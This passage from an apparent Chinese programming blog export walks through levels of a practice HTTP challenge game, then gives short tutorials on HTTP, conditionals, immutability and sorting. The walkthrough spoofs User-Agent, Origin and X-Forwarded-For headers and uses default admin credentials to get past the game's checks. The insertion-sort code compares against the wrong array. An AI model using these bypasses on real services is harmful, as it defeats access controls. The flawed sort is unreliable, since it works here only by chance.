YWRtaW46YWRtaW4xMjM=' }}, (err, res, body) =&gt; { // 所有書籍 const books = JSON.parse(body) // 找出包含「我」跟「四個字的作者」跟「以 7 結尾的 ISBN 碼」 const target = books.filter(elem =&gt; elem.name.includes('我') &amp;&amp; elem.author.length === 4 &amp;&amp; elem.ISBN.endsWith('7')) // 結果 console.log(target)}) response： 12345678[ { id: 72, name: '日日好日：茶道教我的幸福15味【電影書腰版】', author: '森下典子', ISBN: '9981835427' }] 3. 修正書本資訊知道是哪一本書之後，用 PATCH 去修改 ISBN 的值就好囉： 123456789101112131415const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'PATCH', url: `${API_ENDPOINT_V2}/books/72`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'Content-type': 'application/x-www-form-urlencoded' }, form: { // 把 7 改成 3 ISBN: '9981835423' }}, (err, res, body) =&gt; { console.log(body)}) response： 1{\"message\":\"\\n希望之後他們能引進語音輸入系統，我就只要講講話就好。下一關的 token 為 {NeuN}\\n\"} 第八關結束，進到下一關。 備註：{NeuN} 是德文的 9。 第九關1. 開場利用第八關給的 token：{NeuN}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv9?token={NeuN}',(err, res, body) =&gt; { console.log(body)}) response： 12345678API 文件裡面有個獲取系統資訊的 endpoint 你記得嗎？工程師跟我說這個網址不太一樣，用一般的方法是沒辦法成功拿到回傳值的。想要存取的話要符合兩個條件：1. 帶上一個 X-Library-Number 的 header，我們圖書館的編號是 202. 伺服器會用 user agent 檢查是否是從 IE6 送出的 Request，不是的話會擋掉順利拿到系統資訊之後應該會有個叫做 version 的欄位，把裡面的值放在 query string 給我吧。 2. 取得系統資訊這邊要多帶上兩個 header，分別是 X-Library-Number 跟 User-Agent。 X-Library-Number 這種以 X 為前綴的代表是自定義的 header，不在 HTTP 規範中，不加也沒關係，但這裡的伺服器需要識別，所以得加上這個欄位。 而 User-Agent 是用來紀錄用戶端的「瀏覽器資訊」跟「作業系統」等等的資訊，所以這邊要把它改成是 IE6 的內容。直接上網查就可以找到了：Changing User Agent to IE6 or lower for curl call 原始碼： 123456789101112const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request({ method: 'GET', url: `${API_ENDPOINT_V2}/sys_info`, headers: { 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)' }}, (err, res, body) =&gt; { console.log(body)}) response： 1{\"message\":\"success\",\"version\":\"1A4938Jl7\",\"owner\":\"lib\",\"createdAt\":\"121290329301\"} 這裡補充一下，「改 User-Agent 的內容」是在不使用「瀏覽器」的前提下才可以做到的事情。如果你是透過瀏覽器來發 request 的話是沒辦法改的，詳細可以參考 從遊戲來認識 CORS 與瀏覽器的限制。 接著把 1A4938Jl7 帶到參數裡就解決第九關了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv9?token={NeuN}&amp;version=1A4938Jl7',(err, res, body) =&gt; { console.log(body)}) response： 1限制這麼多都被你突破了，真有你的。要不要考慮以後來我們圖書館當工程師啊？下一關的 token 為 {duZDsG3tvoA} 備註：{duZDsG3tvoA} 是 半島鐵盒 的 youtube 編號。 第十關1. 開場利用第九關給的 token：{duZDsG3tvoA}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv10?token={duZDsG3tvoA}',(err, res, body) =&gt; { console.log(body)}) response： 12345678時間過得真快啊，今天是你在這邊幫忙的最後一天了。我們來玩個遊戲吧？你有玩過猜數字嗎？出題者會出一個四位數不重複的數字，例如說 9487。你如果猜 9876，我會跟你說 1A2B，1A 代表 9 位置對數字也對，2B 代表 8 跟 7 你猜對了但位置錯了。開始吧，把你要猜的數字放在 query string 用 num 當作 key 傳給我。 2. 猜出正確的數字就是根據題目的敘述來猜就行了，正確的數字為 9613： 1234request('https://lidemy-http-challenge.herokuapp.com/lv10?token={duZDsG3tvoA}&amp;num=9613', (err, res, body) =&gt; { console.log(body)}) response： 12345678910很開心在這裡的時光能有你一起陪伴，讓我的生活不再那麼一成不變，很開心認識你，下次有機會再一起玩吧！The End，恭喜破關！author: huli@lidemy.comhttps://www.facebook.com/lidemytw/附註：原本遊戲只規劃到這邊，第十關就是最後一關。後來我有加了一些新關卡但難度較高，如果你還想挑戰看看，下一關的 token 為 {IhateCORS} 第十一關1. 開場利用第十關給的 token：{IhateCORS}，發一個 GET 請求就 OK 了： 12345const request = require('request')request('https://lidemy-http-challenge.herokuapp.com/lv11?token={IhateCORS}', (err, res, body) =&gt; { console.log(body)}) response： 123456嘿！很開心看到你願意回來繼續幫忙，這次我們接到一個新的任務，要跟在菲律賓的一個中文圖書館資訊系統做串連這邊是他們的 API 文件，你之後一定會用到：https://gist.github.com/aszx87410/0b0d3cabf32c4e44084fadf5180d0cf4。現在就讓我們先跟他們打個招呼吧，只是我記得他們的 API 好像會限制一些東西就是了... 記得把 API 網址存起來。 2. 打招呼接著就按照 API 文件的說明，發一個「打招呼」的 request： 12345const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request(`${API_ENDPOINT}/hello`, (err, res, body) =&gt; { console.log(body)}) response： 1您的 origin 不被允許存取此資源，請確認您是從 lidemy.com 送出 request。 這時候會跟你說你的位置不允許，所以我們又得再加一些設定了。還記得 第九關 的套路嗎？ 這裡用一樣的做法就可以了： 1234567891011const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/hello`, headers: { 'Origin': 'https://lidemy.com' }},(err, res, body) =&gt; { console.log(res.request.headers) console.log(body)}) response： 1Hello! 下一關的 token 為 {r3d1r3c7} 備註：再次提醒，「改 Origin 的」和「改 User-Agent」一樣都是建立在不使用「瀏覽器」的前提下才能做到的事。 第十二關1. 開場利用第十一關給的 token：{r3d1r3c7}，發一個 GET 請求就 OK 了： 12345const request = require('request')request('https://lidemy-http-challenge.herokuapp.com/lv12?token={r3d1r3c7}', (err, res, body) =&gt; { console.log(body)}) response： 123456打完招呼之後我們要開始送一些書過去了，不過其實運送沒有你想像中的簡單，不是單純的 A 到 B 而已而是像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地...算了，我跟你說那麼多幹嘛現在請你幫我把運送要用的 token 給拿回來吧，要有這個 token 我們才能繼續往下一步走 2. 取得運送 Token這時候一樣按照 API 文件來發出「獲取運送 token」的 request： 1234567const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { console.log(body)}) response： 1我已經把運送要用的 token 給你囉，請你仔細找找 當時我的內心充滿了問號，還以為是在玩什麼反白梗之類的，但很遺憾：不要瞎掰好嗎。 所以就來調查一下吧，我們先試著從 headers 來看能不能找出一點蛛絲軌跡： 12345678const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { // 檢查 response headers console.log(res.headers)}) response： 123456789{ server: 'Cowboy', connection: 'close', 'x-powered-by': 'Express', 'content-type': 'text/plain; charset=utf-8', date: 'Sat, 15 Jan 2022 07:05:12 GMT', 'content-length': '66', via: '1.1 vegur'} 嗯…沒有什麼有用的資訊，所以接著改看請求的 headers 吧： 12345678const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`,},(err, res, body) =&gt; { // 檢查 request headers console.log(res.request.headers)}) response： 123{ referer: 'https://lidemy-http-challenge.herokuapp.com/api/v3/stopover'} 哦哦！原來是被「轉址」了阿，難怪一開始會說： 像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地… 這表示我們想要的資訊說不定就放在被轉址「之前的位置」，只要能夠找到原本的位置就行了。 這邊有兩種作法，我先講比較簡單的：利用瀏覽器 在網址輸入 API 的網址： https://lidemy-http-challenge.herokuapp.com/api/v3/deliver_token 這時候會看到直接被重新導向到 /deliver_token_result 的位置 接下來請打開 F12，並切換到「Network」的欄位，重新輸入正確的 API 網址送出。最後應該就能看到以下資訊： 備註：狀態碼的意思可以參考我寫的 HTTP 懶人包 所以我們一共經過了三個地方：deliver_token =&gt; stopover =&gt; deliver_token_result 而 token 確實就放在 deliver_token 的 response headers 中，只是因為剛剛被重新導向到 deliver_token_result 所以才看不到。 有興趣的人可以自己把每個 request 的內容打開來看，這邊我就不貼圖片了，因為我懶。順道一提「stopover」是「中途停留」的意思。 接下來說明第二種作法：在 Node.js 中阻止重新導向 因為我是用 request 來發送請求的，所以要參考它的官方文件說明： followRedirect - follow HTTP 3xx responses as redirects (default: true). This property can also be implemented as function which gets response object as a single argument and should return true if redirects should continue or false otherwise. 簡單來說就是你可以設定一個 followRedirect 的「option」，只要讓這個 function 回傳 false 就不會被自動轉址了： 1234567891011121314const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/deliver_token`, // 阻止重新導向 followRedirect: function() { return false }},(err, res, body) =&gt; { // 順便檢查一下狀態碼 console.log(res.statusCode) // response headers console.log(res.headers)}) response： 12345678910111213302{ server: 'Cowboy', connection: 'close', 'x-powered-by': 'Express', 'content-type': 'text/plain; charset=utf-8', 'x-lv13-token': '{qspyz}', location: '/api/v3/stopover', vary: 'Accept', 'content-length': '38', date: 'Sat, 15 Jan 2022 07:41:04 GMT', via: '1.1 vegur'} 就跟剛剛在瀏覽器看到的一樣，得到 302 重新導向的狀態碼，導向的位置也是 stopover。 總而言之，看你喜歡哪種方法就用哪種，最後就順利拿到 token 囉！ 第十三關1. 開場利用第十二關給的 token：{qspyz}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv13?token={qspyz}', (err, res, body) =&gt; { console.log(body)}) response： 1234太好了！自從你上次把運送用的 token 拿回來以後，我們就密切地與菲律賓在交換書籍可是最近碰到了一些小問題，不知道為什麼有時候會傳送失敗我跟他們反映過後，他們叫我們自己去拿 log 來看，你可以幫我去看看嗎？從系統日誌裡面應該可以找到一些端倪 2. 查看系統日誌一樣先按照 API 文件來發一個「獲取系統日誌」的請求： 1234567const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/logs`,},(err, res, body) =&gt; { console.log(body)}) response： 1此 request 不是來自菲律賓，禁止存取系統資訊。 這代表 server 會檢查使用者的 IP 地址，所以我們可以透過「proxy（代理伺服器）」來發送請求。 所以只要找到一個菲律賓的 proxy 來做設定就可以了。不過這邊我弄了老半天就是不行，每當我設定好 proxy 的時候網路就會掛掉，我也不確定問題出在哪。如果有人知道原因的話請務跟告訴我一下QQ。 因此這裡改用另外一種解法：設定 X-Forwarded-For 簡單來說 server 可以透過這個 header 來判斷使用者的 IP 地址，因此只要把 IP 地址設成菲律賓的位置就行了： 12345678910const API_ENDPOINT = 'https://lidemy-http-challenge.herokuapp.com/api/v3'request({ url: `${API_ENDPOINT}/logs`, headers: { 'X-Forwarded-For': '49.145.251.55' }},(err, res, body) =&gt; { console.log(body)}) response： 123[ { logType: 'token', value: '{SEOisHard}' }] 千辛萬苦地進到下一關（汗 第十四關1. 開場利用第十三關給的 token：{SEOisHard}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv14?token={SEOisHard}', (err, res, body) =&gt; { console.log(body)}) response： 12345678跟那邊的溝通差不多都搞定了，真是太謝謝你了，關於這方面沒什麼問題了！不過我老大昨天給了我一個任務，他希望我去研究那邊的首頁內容到底是怎麼做的為什麼用 Google 一搜尋關鍵字就可以排在第一頁，真是太不合理了他們的網站明明就什麼都沒有，怎麼會排在那麼前面？難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎看到的內容跟我們看到的不一樣？算了，還是不要瞎猜好了，你幫我們研究一下吧！ 2. 檢查首頁內容這裡顯然要檢查一下首頁的部分，所以一樣先按照 API 文件來發一個「獲取首頁內容」的請求： 123456request({ url: `${API_ENDPOINT}/index`,},(err, res, body) =&gt; { console.log(body)}) response： 1234&lt;html&gt; &lt;h1&gt;Library&lt;/h1&gt; &lt;p&gt;Hello, here is the website for lidemy library&lt;/p&gt;&lt;/html&gt; 果然看不出個所以然。回想一下剛剛的敘述「難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎 看到的內容跟我們看到的不一樣？」 所以換句話說要讓 server「以為」我們是 Google 搜尋引擎，但該怎麼做呢？想想之前的套路，既然都有辦法讓 server 以為是 IE6 了，那搜尋引擎應該也是同樣的道理。 所以試著搜尋：「search engine user agent list」 你就能找到這個 網站 備註：如果想知道更多細節，這個網站 寫的還蠻簡單易懂的。 接下來應該就知道該怎麼做了吧？ 123456789request({ url: `${API_ENDPOINT}/index`, headers: { 'User-Agent': 'Googlebot/2.1 (+http://www.googlebot.com/bot.html)' }},(err, res, body) =&gt; { console.log(body)}) response： 12345&lt;html&gt; &lt;h1&gt;I Love Google&lt;/h1&gt; &lt;p&gt;Google please rank our website higher, PLEASE!&lt;/p&gt; &lt;!-- token for lv15：{ILOVELIdemy!!!} --&gt;&lt;/html&gt; 接下來終於來到最後一關囉… 第十五關利用第十四關給的 token：{ILOVELIdemy!!!}，發一個 GET 請求就 OK 了： 1234request('https://lidemy-http-challenge.herokuapp.com/lv15?token={ILOVELIdemy!!!}', (err, res, body) =&gt; { console.log(body)}) response： 1234567891011121314151617還真的是我猜的那樣...不過還是要謝謝你幫我們完成這麼多任務！今天是我在這職位的最後一天啦，之後我要升官了，應該就不用處理這麼多小事情了這段期間感謝你的幫忙，我們以後有緣再相見啦！The End，恭喜破關！這次是真的破關了，這是最後一關，感謝你願意參與這個遊戲也希望這遊戲是有趣的，希望你在玩的時候有學到東西也歡迎把這個遊戲分享給親朋好友們感謝！我開了一個 gist，大家可以在這邊隨意留言，或是講一下破關感言https://gist.github.com/aszx87410/1dbde92876ba253a45654988ca829ebb最後，感謝所有幫我測試的朋友們Author: huli@lidemy.comhttps://www.facebook.com/lidemytw/ 完結撒花啦～ 心得好不容易破關啦！第十五關後的難度真的明顯提升，尤其是第十三關真的讓卡了很久，明明就按照網路上的教學去設定 proxy 了，但就是沒有辦法，最後只好不甘心的上網找正確解答，才發現了 X-Forwarded-For 的解法。 在這個遊戲裡讓我感觸最深的地方還是「執行環境」這件事吧，例如說改「Origin」和「User-Agent」真的讓我大開眼界，這跟我熟悉的「瀏覽器」完全是兩個世界，原來脫離了瀏覽器可以做到的事這麼多，這是我覺得很有趣的地方。 另外還有一點是原來 server 還能從 User-Agent 來判斷是不是爬蟲，甚至還有專屬爬蟲的 User-Agent，原本單純的我完全不知道有這樣神奇的事情存在，很慶幸我能從這個遊戲裡學到這些。 最後很謝謝 Huli 為大家做了這個遊戲，這是一個很有意思也能學到很多東西的遊戲，這個遊戲除了讓我更了解網路世界外，也更了解在前後端這兩個角色在自己的世界裡實際上都做了些什麼。","link":"/2022/01/10/http-challenge/"},{"title":"HTTP 懶人包","text":"關於 HTTP 的東西都在這。 HTTP？就是一個「協定」，也可以說是一套「標準」，就像千千為訂便當制定的標準，大家都可以透過這個標準來做溝通。 常見的 HTTP Method GET 請求完整資料 HEAD 只請求 header 資料 POST 傳送資料到 server PUT 更新資料內容（整筆取代） PATCH 更新資料內容（只取代部分） DELETE 刪除指定資料 OPTIONS 查看指定 server 提供哪些服務 常見的 Status code大範圍： 1xx 處理中等一下 （Hold on） 2xx 成功 （Here you go） 3xx 你去其他地方 （Go away） 4xx 用戶端出錯 （You fucked up） 5xx 伺服器出錯 （I fucked up） 例子： 100 =&gt; 我有收到你的請求，請你繼續發下一個 request。 200 =&gt; 成功，可能是取得資料或是傳送成功 201 =&gt; 成功建立資料（通常是 POST） 202 =&gt; 我收到你的請求了，但我還沒有處裡完（也不知道什麼時候會處理完） 204 =&gt; 成功，但我沒有什麼想跟你回應的（例如 DELETE） 206 =&gt; 成功（發生在 Client 只請求一部分的資料） 300 =&gt; 有一個以上的回應結果，你或我挑出其中一個（沒有明確規範） 301 =&gt; 永久搬家，下次不會再去原家，直接去新家 302 =&gt; 暫時搬家，下次還是會先去原家，再決定去哪 303 =&gt; 不會傳 Location 給你，而是直接幫你重新導向到某個地方（通常在 POST 成功後） 304 =&gt; 客戶端有緩存檔案（含 If-Modified-Since 的 request header），可以節省傳輸流量 400 =&gt; 語法錯誤 or 請求太大 401 =&gt; 沒通過身分驗證 403 =&gt; 你沒有權限存取這個資源 404 =&gt; 沒有你要的東西 405 =&gt; 伺服器不允許你使用的 HTTP Method 410 =&gt; 東西曾經在，但現在已經不在了（永久），請你自己去別的地方找 422 =&gt; 通常發生在 POST，可能是傳送的內容不對。 429 =&gt; 請求太多啦，超過請求數量的最大限制。 415 =&gt; 你請求的資料格式伺服器沒有提供（例如 Content-Type 不對） 440 =&gt; 你的連線逾時啦，重新登入一遍再來吧。 414 =&gt; 你的 URL 太長啦（通常是 GET 的 query 太長的關係，可以改用 POST 來解決） 500 =&gt; 未預料的錯誤 503 =&gt; 維護中或過載（提供比 500 更明確一點的資訊，像是「多久後會好」之類的） 補充－HTTP 只是其中一種交換資料的方式以傳紙條的例子來說，可以把「訂便當」的格式想成是遵循 HTTP 這個協議來進行： 1234GET送達時間：第四堂雞腿飯 5雞排飯 2 但如果是「借籃球」，就不需要採取 HTTP 協議來進行： 12A：借五顆籃球B：好 所以 HTTP 只是其中一種交換資料的方式，並不代表「只能用這種方式」來進行。就跟 TCP、UDP 一樣，他們只是兩種不同的協議，你可以根據自己的需求來決定要用哪一種協議，而不是一定要用特定哪種協議才是正確的。 所以你當然也可以自己定義一個協議來決定怎麼交換資料，不要被 HTTP 的方式給侷限住了。","link":"/2022/01/05/http-introduction/"},{"title":"if 跟 if else 可能會犯的錯誤","text":"你踩到雷了嗎？ 分清楚使用的時機如果有多個 if ，代表這些 if 之間「沒有關聯性」，但在 if else 的時候是「有關聯性」的。參考這個例子： 12345678var age = 70if (age &gt;= 65) { console.log('老人')} else if (age &gt;= 30) { console.log('年輕人')} else if (age &gt;= 10) { console.log('小孩')} age 的值是 70，如果只有寫 if 的話，age 會符合每一個條件。（大於 65，大於 30，大於 10） 所以 if else 的意義在於：只有在第一個 if「沒有通過」時，才有機會進到下一個 else if 判斷句， 只有寫 if 的情況： 12345678910var age = 70if (age &gt;= 65) { console.log('老人')}if (age &gt;= 30) { console.log('年輕人')}if (age &gt;= 10) { console.log('小孩')} 這樣子寫會得到的結果會是：老人 年輕人 小孩。 通常不寫成 if else 的情況是代表「有一行不管怎樣都要執行」： 1234567var i = 1while (i &lt;= 10) { if (i&amp;1) { console.log(i,'是奇數') } console.log(i++)} 輸出結果： 1234567891011121314151 是奇數123 是奇數345 是奇數567 是奇數789 是奇數910 這個例子有點爛，因為我一時想不到更好的範例。總之想告訴你的是 console.log(i++) 這行不管怎樣都會被執行，所以每一圈都會印出 i，而且當 i 是奇數時會在多印出一次 i 是奇數。","link":"/2021/12/17/if-and-if-else-problem/"},{"title":"if 的演化史","text":"從 if 到 if else 在到 else if。 成長過程假設條件： age &gt;= 65，老人 65 &gt; age &gt;= 20，年輕人 20 &gt; age，小孩 最原始1234567891011var age = 70if (age &gt;= 65) { console.log('老人')}if (age &lt; 65 &amp;&amp; age &gt;= 20) { console.log('年輕人')}if (age &lt; 20) { console.log('小孩')} 每個 if 之間沒有關聯性，所以條件就得寫的非常明確，不然執行邏輯上會出錯。 進化成 if else12345678910// 進化成 if else if (age &gt;= 65) { console.log('老人')} else { if (age &gt;= 20) { console.log('年輕人') } else { console.log('小孩') }} if else 讓判斷流程之間具有關聯性，讓條件變得簡潔了！唯一的缺點是太過巢狀，不是很好閱讀。 進化成 else if12345678// 進化成 else if if (age &gt;= 65) { console.log('老人')} else if (age &gt;= 20) { console.log('年輕人')} else if (age &lt; 20){ console.log('小孩')} 錦上還要再添花，else if 不只保留條件之間的關聯性，也讓可讀性變得更好！ 同場加映（if 的小技巧）12345678var score = 60var isPass = nullif (score &gt;= 60) { isPass = true} else { isPass = fasle} 其實有更簡單的寫法： 12var score = 60var isPass = (score &gt;= 60) 因為 score &gt;= 60 的運算值正好跟 isPass 要設定的值同，所以才可以這樣寫。","link":"/2021/12/17/if-condition/"},{"title":"Immutable 的觀念","text":"玩壞腦袋的東西。 其實就跟在 從 Object 的等號來真正理解變數 提到的概念很類似。 Immutable 不可變除了物件以外的資料型態都是屬於「immutable」，就是值沒辦法被改變。 例如說： 123var a = 'hello'a.toUpperCase()console.log(a) // hello 這樣寫是絕對沒辦法改變 a 的值的。就跟你沒辦法在 function 裡面去改外面變數的值是一樣的道理。這個就叫做「不可變」。 所以你絕對不會看到用 String.method() Number.method() 就可以原變數的值的東西，而都是用回傳的方式來產生一個新的值。 Mutable 可變只有物件，陣列是可以被改變的，關鍵字：「Mutator methods」 一個最常見的例子： 1234var arr = [1, 2, 3]var res = arr.push(1, 2)console.log(arr) // 修改原陣列console.log(res) // 回傳值 一個陣列使用 push 後原本的內容就會被改變。所以你不會用看到用第二行的寫法來，那樣子只會得到 push 執行完的回傳值（陣列的長度）。 其他還有像是 Array.splice、Array.sort() 也都是一樣的例子。 讓一個物件變成不可變的方法Object.freeze(obj) 可以讓一個物件或陣列變成 immutable： 123var arr = [1, 2, 3]Object.freeze(arr)arr.splice(1, 1, 'hi') // TypeError: Cannot assign to read only property '1' of object '[object Array]' 如果你真的有這種要讓「物件」變成不可變的需求，可以使用這個內建方法。（但我目前也不知道有什麼情況會需要這樣做就是了）","link":"/2021/12/20/immutable/"},{"title":"一個 import 的小技巧","text":"熟能生巧。 簡述這個是我在工作時碰到的問題，就是會碰到有一大堆東西要 import 時，你的 code 會長得像這樣： 123456789101112131415161718192021222324// App.jsimport Comp1 from \"./components/Comp1\";import Comp2 from \"./components/Comp2\";import Comp3 from \"./components/Comp3\";import Comp4 from \"./components/Comp4\";import Comp5 from \"./components/Comp5\";import Comp6 from \"./components/Comp6\";// ...略function App () { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path=\"path1\" element={&lt;Comp1 /&gt;} /&gt; &lt;Route path=\"path2\" element={&lt;Comp2 /&gt;} /&gt; &lt;Route path=\"path3\" element={&lt;Comp3 /&gt;} /&gt; &lt;Route path=\"path4\" element={&lt;Comp4 /&gt;} /&gt; &lt;Route path=\"path5\" element={&lt;Comp5 /&gt;} /&gt; &lt;Route path=\"path6\" element={&lt;Comp6 /&gt;} /&gt; {/* ...略 */} &lt;/Routes&gt; &lt;/Router&gt; )} 這時候 App.js 可能就會有好幾百行，但有 50% 都是在 import 那些元件。 如果你覺得這樣很不順眼的話，其實可以利用一種小技巧來把元件的部分給拆出去。 這邊我們要新建一隻 AllCom.js，這個檔案只負責用來 import 那些元件： 1234567891011121314151617import Comp1 from \"./components/Comp1\";import Comp2 from \"./components/Comp2\";import Comp3 from \"./components/Comp3\";import Comp4 from \"./components/Comp4\";import Comp5 from \"./components/Comp5\";import Comp6 from \"./components/Comp6\";// ...略export { Comp1, Comp2, Comp3, Comp4, Comp5, Comp6, // ...略} 這樣子做以後呢，App.js 就可以改寫成這樣子： 123456789101112131415161718// 現在只要一行就搞定import * as All from \"./components/AllCom\";function App () { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path=\"path1\" element={&lt;All.Comp1 /&gt;} /&gt; &lt;Route path=\"path2\" element={&lt;All.Comp2 /&gt;} /&gt; &lt;Route path=\"path3\" element={&lt;All.Comp3 /&gt;} /&gt; &lt;Route path=\"path4\" element={&lt;All.Comp4 /&gt;} /&gt; &lt;Route path=\"path5\" element={&lt;All.Comp5 /&gt;} /&gt; &lt;Route path=\"path6\" element={&lt;All.Comp6 /&gt;} /&gt; {/* ...略 */} &lt;/Routes&gt; &lt;/Router&gt; )} 雖然很簡短，但這是蠻實用的方式。","link":"/2022/06/16/import-trick/"},{"title":"用 in 運算子檢查 Object 的屬性","text":"做題目時學到的。 簡述in 除了用在 for...in 以外，還可以用在 if...in。 兩者的概念差不多，在迴圈裡的 in 是用來「遍歷物件的 key」，而 if 中的 in 是用來檢查「物件裡有沒有這個 key」，有的話回傳 true，否則 false。 附註：但沒有 if...of 的寫法哦。 來直接看例子： 12345678const obj = { name: 'PeaNu', age: 20, gender: 'man'}if ('name' in obj) console.log('has name'); if ('age' in obj) console.log('has age');if ('gender' in obj) console.log('has gender'); 就這樣～","link":"/2022/03/17/in-operator/"},{"title":"關於 <input> 的寬度問題","text":"忍你很久了，今天就把你給解決！ 情境如果你想做這個畫面： 你大概會這樣寫： 1234567891011121314151617&lt;style&gt;.input-block { display: flex;}.input-block__text { flex-shrink: 0;}.input-block__input { flex: 1;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\"&gt;&lt;/div&gt; 這時候你就會發現 &lt;input&gt; 的寬度沒辦法縮到很小： 長話短說在上面的例子你可能會想說加上 flex-shrink: 0 或 min-width: 0 來處理，但很抱歉，都沒有用哦！ 其實 &lt;input&gt; 會自帶一個寬度，應該是標籤上的 size 屬性： 1&lt;input type=\"text\" size=\"20\"&gt; 在 Chrome 上大概會是 200px 的寬，所以如果你沒有設定 width 的話，當 &lt;input&gt; 被縮放到很小的時候，他就會固定在 size 的寬度。 至於 Flex 的部分比較特殊，flex: 1 確實可以讓元素吃到剩餘空間來填滿容器，但如果沒有設定 width 就會有上面的問題。 解決辦法記住一個要訣就好，如果你要讓 &lt;input&gt; 寬度可以自適應，那就幫他加上 width： 1234567891011121314151617&lt;style&gt;.input-block { display: flex;}.input-block__text { flex-shrink: 0;}.input-block__input { flex: 1; width: 100%;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\"&gt;&lt;/div&gt; 如果是在 block-level 的空間中也是同樣道理： 12345678910111213&lt;style&gt;.input-block { display: block;}.input-block__input { /* 預設的情況 */ width: auto;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt;&lt;/div&gt; 把 &lt;input&gt; 加上 width： 123456789101112&lt;style&gt;.input-block { display: block;}.input-block__input { width: 100%;}&lt;/style&gt;&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt;&lt;/div&gt;","link":"/2022/01/19/input-width-problem/"},{"title":"插入排序法（Insertion-sort）","text":"很日常的演算法，但寫成 Code 卻格外抽象。 概念跟玩撲克牌一樣，先把一張牌抽出來，接著跟前面排好的牌比大小，最後插到正確的位置。 流程圖： 實作12345678910111213141516171819202122232425function insertionSort(arr) { // 把第一個數字放到排序好的數列 let sortedNumbers = [arr[0]] // 遍歷所有數字（從第二個數字開始） for (let i=1; i&lt;arr.length; i++) { // 抽出來的數字 const extractNumber = arr[i] // 要插入的位置（初始值為最後面） let insertIndex = sortedNumbers.length // 遍歷已排序好的數列（由後到前） for (let j=sortedNumbers.length-1; j&gt;=0; j--) { // 如果抽出來的數字 &lt; 排序好的數字， if (extractNumber &lt; arr[j]) { // 把要插入的位置往前移一位 insertIndex -= 1 } } // 把抽出來的數字插入到正確位置 sortedNumbers.splice(insertIndex, 0, extractNumber) } // 回傳結果 return sortedNumbers}const numbers = [5, 44, 23, 21, 64, 15]console.log(insertionSort(numbers)) // [ 5, 15, 21, 23, 44, 64 ] 詳細步驟： 12345678910111213141516171819202122232425262728293031323334extractNumber: 44compare: 5insertIndex: 1sortedNumbers: [ 5, 44 ]extractNumber: 23compare: 44compare: 5insertIndex: 1sortedNumbers: [ 5, 23, 44 ]extractNumber: 21compare: 44compare: 23compare: 5insertIndex: 1sortedNumbers: [ 5, 21, 23, 44 ]extractNumber: 64compare: 44compare: 23compare: 21compare: 5insertIndex: 4sortedNumbers: [ 5, 21, 23, 44, 64 ]extractNumber: 15compare: 64compare: 44compare: 23compare: 21compare: 5insertIndex: 1sortedNumbers: [ 5, 15, 21, 23, 44, 64 ]","link":"/2022/01/17/insertion-sort/"},{"title":"執行 IIFE 的三種方式","text":"懶人包一下。 原理簡述除了熟悉的這個方法： 123(function havename () { console.log('IIFE!')})() 還有以下這些方法： 123456789~function havename () { console.log('IIFE!')}()-function havename () { console.log('IIFE!')}()+function havename () { console.log('IIFE!')}() 備註：故意寫成命名函式是因為 IIFE 沒有限定必須是匿名函式。 其實原理都是一樣的，讓 function 變成是一個「運算式（Expression）」，只是這些「一元運算子（Unary operator）」也有相同的作用。","link":"/2022/01/22/invoke-IIFE-in-3-way/"},{"title":"判斷等比數列","text":"來自 LIOJ 上的題目，也是蠻有趣的一題。 常犯的錯誤如果看完題目直接開始做，通常我們會這樣子寫： 12345678function isSequence(arr) { for(let i=1; i&lt;arr.length; i++) { // 判斷第二個元素 / 第一個元素 !== 第三個元素 / 第二個元素 if(arr[i]/arr[i-1] !== arr[i+1]/arr[i]) return false } return true}console.log(isSequence([1, 2, 4, 8, 16])) // false 為什麼最後是 false？ 因為當迴圈跑到 i=4 的時候，裡面的 array[i+1] 會有問題 =&gt; array[5] 沒有元素。 所以這個時候迴圈的條件就得改成 for(let i=1; i&lt;array.length-1; i++)，雖然這樣就能得出正確結果，但同時也是很不直覺的寫法。 寫迴圈時都該注意最大與最小範圍當 i 是從 1 ~ n-1 的時候，如果出現 i+1 